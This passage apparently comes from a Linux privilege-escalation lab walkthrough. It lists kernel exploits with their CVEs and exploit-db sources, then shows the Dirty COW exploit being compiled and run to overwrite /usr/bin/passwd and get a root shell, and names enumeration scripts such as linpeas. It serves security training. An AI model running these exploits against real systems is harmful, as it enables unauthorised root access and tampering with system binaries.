  [6] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [8] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [9] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [10] ptrace_kmod2
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
      Source: http://www.exploit-db.com/exploits/15023
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024
```

- Compile and run the exploit code to gain root access:

```bash
user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
user@debian:~$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap c8806000


madvise 0

ptrace 0

user@debian:~$ /usr/bin/passwd
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user# mv /tmp/bak /usr/bin/passwd
root@debian:/home/user# exit
exit

```

---

##  Privilege Escalation Scripts

- Listing all the Privilege Escalation Scripts:

```bash
user@debian:~$ cd  /home/user/tools/privesc-scripts
user@debian:~/tools/privesc-scripts$ 
user@debian:~/tools/privesc-scripts$ ls
LinEnum.sh  linpeas.sh  lse.sh
```

- Experiment with all three tools, running them with different options!

---
